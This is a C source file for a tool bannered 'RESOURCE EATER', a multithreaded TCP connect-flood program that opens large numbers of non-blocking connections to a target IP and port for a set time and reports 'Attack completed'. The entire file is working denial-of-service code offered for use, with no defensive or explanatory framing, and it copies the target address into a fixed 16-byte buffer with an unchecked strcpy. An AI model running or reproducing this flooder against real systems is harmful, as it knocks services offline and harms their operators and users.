#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int threads;
    int sockets_per_thread;
} connect_params;

void *connect_flood(void *arg) {
    connect_params *params = (connect_params *)arg;
    
    time_t end_time = time(NULL) + params->duration;
    int max_sockets = params->sockets_per_thread;
    int sockets[max_sockets];
    
    while (time(NULL) < end_time) {
        for (int i = 0; i < max_sockets; i++) {
            sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sockets[i] < 0) continue;
            
            fcntl(sockets[i], F_SETFL, O_NONBLOCK);
            
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(params->target_port);
            addr.sin_addr.s_addr = inet_addr(params->target_ip);
            
            connect(sockets[i], (struct sockaddr *)&addr, sizeof(addr));
            usleep(1000);
        }
        
        for (int i = 0; i < max_sockets; i++) {
            if (sockets[i] > 0) {
                close(sockets[i]);
            }
        }
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║           RESOURCE EATER                 ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");
    
    if (argc != 6) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS> <SOCKETS_PER_THREAD>\n", argv[0]);
        printf("Example: %s 1.1.1.1 80 60 100 500\n", argv[0]);
        return 1;
    }
    
    connect_params params;
    params.target_port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    params.threads = atoi(argv[4]);
    params.sockets_per_thread = atoi(argv[5]);
    strcpy(params.target_ip, argv[1]);
    
    printf("[+] Target: %s:%d\n", params.target_ip, params.target_port);
    printf("[+] Threads: %d\n", params.threads);
    printf("[+] Sockets per thread: %d\n", params.sockets_per_thread);
    printf("[+] Total sockets: %d\n", params.threads * params.sockets_per_thread);
    printf("[+] Mode: TCP Connect Flood\n\n");
    
    pthread_t threads[params.threads];
    
    for (int i = 0; i < params.threads; i++) {
        pthread_create(&threads[i], NULL, connect_flood, &params);
    }
    
    for (int i = 0; i < params.threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n[+] Attack completed\n");
    return 0;
}